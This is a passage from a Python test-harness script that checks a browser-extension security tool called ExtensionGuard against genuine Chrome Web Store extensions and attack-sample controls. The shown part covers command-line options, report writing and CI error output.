    if summary:
        with open(summary, "a", encoding="utf-8") as f:
            f.write(markdown)
    for problem in all_problems(report):
        text = problem.replace("%", "%25").replace("\r", "").replace("\n", "%0A")
        print(f"::error title=Real-extension check::{text}")


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Test ExtensionGuard against real Chrome Web Store extensions.",
        epilog="Exit codes: 0 all checks passed, 1 a check failed, 2 the test could not run.",
    )
    parser.add_argument(
        "--runtime",
        action="store_true",
        help="also run the extensions in Chrome for Testing with the monitor",
    )
    parser.add_argument(
        "--chrome", metavar="PATH", help="Chrome for Testing executable (needed for --runtime)"
    )
    parser.add_argument(
        "--cache-dir",
        metavar="DIR",
        help="keep downloaded .crx files here and reuse ones that still "
        "match the store (default: a temporary folder)",
    )
    parser.add_argument("--json-report", metavar="PATH", help="write the full report as JSON")
    parser.add_argument("--markdown", metavar="PATH", help="write the summary as Markdown")
    parser.add_argument(
        "--work-dir",
        metavar="DIR",
        help="an empty folder to work in and KEEP afterwards (monitor log, alerts, unpacked "
        "extensions, Chrome profile) - for investigating a failure",
    )
    parser.add_argument("--only", metavar="SLUG", action="append",
                        choices=[ext["slug"] for ext in EXTENSIONS],
                        help="test only this extension (repeatable)")  # fmt: skip
    return parser.parse_args(argv)


def main(argv: list | None = None) -> int:
    # Never crash on a non-ASCII extension name in a Windows console / CI log
    for stream in (sys.stdout, sys.stderr):
        stream.reconfigure(errors="backslashreplace")
    args = parse_args(argv)
    if args.runtime and not args.chrome:
        print("ERROR: --runtime needs --chrome PATH (Chrome for Testing)", file=sys.stderr)
        return 2
    chosen = [ext for ext in EXTENSIONS if not args.only or ext["slug"] in args.only]
    if args.work_dir and Path(args.work_dir).exists() and any(Path(args.work_dir).iterdir()):
        print(f"ERROR: --work-dir {args.work_dir} is not empty", file=sys.stderr)
        return 2

    report = {
        "meta": {
            "date": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
            "extensionguard_version": EXTGUARD_VERSION,
            "python": platform.python_version(),
            "platform": f"{platform.system()} {platform.release()}",
        }
    }
    try:
        with tempfile.TemporaryDirectory(
            prefix="eg-realcheck-", ignore_cleanup_errors=True
        ) as tmp:  # fmt: skip
            work = Path(args.work_dir or tmp)
            work.mkdir(parents=True, exist_ok=True)
            cache = Path(args.cache_dir) if args.cache_dir else work / "crx"
            cache.mkdir(parents=True, exist_ok=True)
            report["extensions"] = check_genuine(chosen, cache, work / "home")
            report["controls"] = check_controls(work / "controls")
            if args.runtime:
                report["runtime"] = check_runtime(report["extensions"], Path(args.chrome), work)
            for result in report["extensions"]:
                result.pop("path", None)  # a temp path means nothing to readers
    except SetupError as exc:
        print(f"ERROR: the test could not run: {exc}", file=sys.stderr)
        if os.environ.get("GITHUB_ACTIONS") == "true":
            print(f"::error title=Real-extension check could not run::{exc}")
        return 2

    problems = all_problems(report)
    report["passed"] = not problems
    markdown = render_markdown(report)
    if args.json_report:
        Path(args.json_report).write_text(json.dumps(report, indent=1), encoding="utf-8")
    if args.markdown:
        Path(args.markdown).write_text(markdown, encoding="utf-8")
    github_outputs(report, markdown)

    print()
    if problems:
        print(f"FAIL - {len(problems)} problem(s):")
        for problem in problems:
            print(f"  - {problem}")
        return 1
    print(
        f"PASS - {len(report['extensions'])} genuine extensions, "
        f"{len(report['controls'])} attack samples"
        + (", runtime monitor" if report.get("runtime") else "")
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
